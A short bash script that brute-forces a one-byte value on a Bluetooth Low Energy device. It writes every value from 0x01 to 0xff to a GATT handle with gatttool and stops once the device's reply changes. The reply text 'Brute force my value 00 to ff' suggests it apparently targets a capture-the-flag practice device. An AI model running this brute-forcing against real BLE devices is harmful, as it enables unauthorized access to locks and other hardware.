#!/bin/bash

source ./mac
max=255
first=(0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x09 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f)
#mac=24:0a:c4:9b:da:02
handle=0x003c
send()
{
        #bleah -i 1 -b ${MAC} -n ${handle} -d $1
        gatttool -b ${MAC} --char-write-req -a ${handle} -n $1
	sleep 1
	read $1 $2
}

read()
{
	echo "Sent: $1"
	echo "Counter: $2"
	command=$(./read.sh 0x003c)
        echo $command
	if [[ $command = "Brute force my value 00 to ff" ]]; then
		echo "Still Searching......."
	elif [[ $command = "connect error: Connection refused (111)" ]]; then
 		read $1 $2
	else
		echo "We Found the Key!!"
  		exit 0
    	fi
}
counter=1
for j in ${first[@]}; do
	send $j $counter
	((counter++))
done
for((i=16;i<=max;i++))
do
	counter=$i
	i=$(printf "%#x\n" $i)
	send $i $counter
done


